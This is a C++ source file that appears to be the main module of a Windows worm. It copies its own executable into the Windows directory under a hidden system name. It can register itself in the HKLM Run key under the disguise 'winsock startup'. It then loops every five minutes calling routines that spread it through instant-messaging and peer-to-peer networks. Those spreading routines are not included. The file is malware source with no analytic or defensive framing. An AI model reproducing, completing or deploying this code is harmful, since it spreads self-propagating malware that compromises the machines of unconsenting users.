#include "main.h"

//#include <iostream>
//using namespace std;

struct InstallInfo_s
{
   HKEY hKey;
   char szMainPath[MAX_PATH];
   char szFilePath[MAX_PATH];
   char szInstallPath[MAX_PATH];
   char szFilename[MAX_PATH];
};

bool Registry = false;										// Install Registry Key
const char Filename[] = "1.exe";									// Filename Of Worm
char Valuename[] = "winsock startup";						// Valuename For Start-Up
char Version[] = "lul.l0rm";								// Version

bool InitWinSock()
{
    WSADATA wsaData;

    if (&wsaData)
        ZeroMemory(&wsaData, sizeof(wsaData));
    else
        ExitThread(0);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return false;

    if (LOBYTE(wsaData.wVersion) != 2 ||
        HIBYTE(wsaData.wVersion) != 2)
    {
        WSACleanup();
        return false;
    }

    return true;
}


bool Install()
{
   InstallInfo_s pInstallInfo_s;

    if (&pInstallInfo_s)
        ZeroMemory(&pInstallInfo_s, sizeof(InstallInfo_s));
    else
        ExitThread(0);

    GetModuleFileNameA(GetModuleHandle(NULL), pInstallInfo_s.szFilePath, sizeof(pInstallInfo_s.szFilePath));
    GetWindowsDirectoryA(pInstallInfo_s.szMainPath, sizeof(pInstallInfo_s.szMainPath));
//    char *str = "E:\\VirtualMachines";
//    strcpy(pInstallInfo_s.szMainPath, str);
//    //_snprintf_s(pInstallInfo_s.szInstallPath, sizeof(pInstallInfo_s.szInstallPath), 100, "%s\\%s",  pInstallInfo_s.szMainPath, Filename);
    strcpy(pInstallInfo_s.szInstallPath, pInstallInfo_s.szMainPath);
    strcat(pInstallInfo_s.szInstallPath, "\\");
    strcat(pInstallInfo_s.szInstallPath, Filename);
    if (CopyFileA(pInstallInfo_s.szFilePath, pInstallInfo_s.szInstallPath, false) != 0)
    {//1(0) found
        SetFileAttributesA(pInstallInfo_s.szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
    }
    if (Registry)
    {//0
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &pInstallInfo_s.hKey, NULL);
        RegSetValueExA(pInstallInfo_s.hKey, Valuename, 0, REG_SZ, (const unsigned char *)Filename, strlen(Filename));
        RegCloseKey(pInstallInfo_s.hKey);
    }
    return true;
}


int main()
{
    if (!InitWinSock())
        return false;

    Install();

    CreateMutexA(NULL, false, Version);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        ExitProcess(0);


    while (true)
    {
        InfectIM();

        InfectP2P();

        Sleep(1000*300);
    }
    return 0;
}
